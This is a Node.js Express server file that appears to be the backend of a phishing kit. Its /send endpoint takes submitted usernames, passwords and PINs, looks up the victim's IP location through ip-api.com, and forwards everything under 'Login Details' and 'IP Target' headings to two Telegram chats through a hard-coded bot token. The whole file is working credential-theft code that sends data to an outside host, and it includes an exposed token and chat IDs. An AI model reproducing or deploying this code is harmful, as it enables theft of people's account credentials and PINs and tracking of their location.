// index.js
import express from 'express';
import axios from 'axios';

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = '7935094184:AAEtCkwxmdKbOvKZuWmkBFRdxF702BaX0xo';
const CHAT_IDS = ['6260002708', '7409394162'];

// Helper to get client IP (trusting X-Forwarded-For for proxy)
function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  return forwarded ? forwarded.split(',')[0].trim() : req.connection.remoteAddress;
}

app.post('/send', async (req, res) => {
  try {
    const { username = 'N/A', password = 'N/A', pin = 'N/A' } = req.body;

    const clientIP = getClientIP(req);
    // Get geo info
    const geoRes = await axios.get(`http://ip-api.com/json/${clientIP}`);
    const geoData = geoRes.data;

    // Compose message parts (similar to PHP formatting)
    const loginInfo = [
      `Username: ${username}`,
      `Password: ${password}`,
      `PIN: ${pin}`
    ].join('\n');

    const info = [
      `┗━► IP Target: ${clientIP}`,
      `┗━► Country: ${geoData.country || 'N/A'}`,
      `┗━► Region: ${geoData.regionName || 'N/A'}`,
      `┗━► City: ${geoData.city || 'N/A'}`,
      `┗━► Lat/Lon: ${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}`,
      `┗━► Timezone: ${geoData.timezone || 'N/A'}`,
      `┗━► ISP: ${geoData.isp || 'N/A'}`,
      `┗━► Maps: https://www.google.com/maps?q=${geoData.lat || ''},${geoData.lon || ''}`,
      `┗━► Current Time: ${new Date().toISOString()}`
    ].join('\n');

    const userAgent = `User Agent: ${req.headers['user-agent'] || 'N/A'}`;

    const message = `[== Login Details ==]\n${loginInfo}\n────────────────────────────\n[== Other Details ==]\n${info}\n────────────────────────────\n${userAgent}`;

    // Send message to each chat ID
    const sendPromises = CHAT_IDS.map(chat_id =>
      axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id,
        text: message
      })
    );

    const results = await Promise.allSettled(sendPromises);

    res.json({
      success: true,
      results: results.map((r, i) => ({
        chat_id: CHAT_IDS[i],
        status: r.status,
        ...(r.status === 'fulfilled' ? { data: r.value.data } : { reason: r.reason.message })
      }))
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API listening on port ${PORT}`));
